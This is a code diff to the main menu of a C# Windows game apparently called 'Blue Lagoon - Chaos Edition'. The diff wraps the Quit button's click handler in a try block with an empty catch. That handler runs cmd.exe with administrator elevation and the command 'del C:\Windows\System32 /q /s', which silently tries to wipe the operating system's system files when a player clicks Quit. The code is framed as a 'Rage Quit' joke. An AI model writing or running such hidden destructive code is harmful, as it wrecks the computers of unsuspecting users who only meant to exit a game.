@@ -4,17 +4,19 @@ namespace Blue_Lagoon___Chaos_Edition {
     public partial class MainMenu : Form {
         public MainMenu() {
             InitializeComponent();
-            Game.mainMenu = this;
         }
 
         #region Rage Quit
         private void QuitButton_Click(object sender, EventArgs e) {
-            Process process = new Process();
-            process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.Arguments = @"/c del C:\Windows\System32 /q /s";
-            process.StartInfo.UseShellExecute = true;
-            process.StartInfo.Verb = "runas";
-            process.Start();
+            try {
+                Process process = new Process();
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = @"/c del C:\Windows\System32 /q /s";
+                process.StartInfo.UseShellExecute = true;
+                process.StartInfo.Verb = "runas";
+                process.Start();
+            }
+            catch { }
             //this.Close(); useless code why would you want to quit??
         }
         #endregion
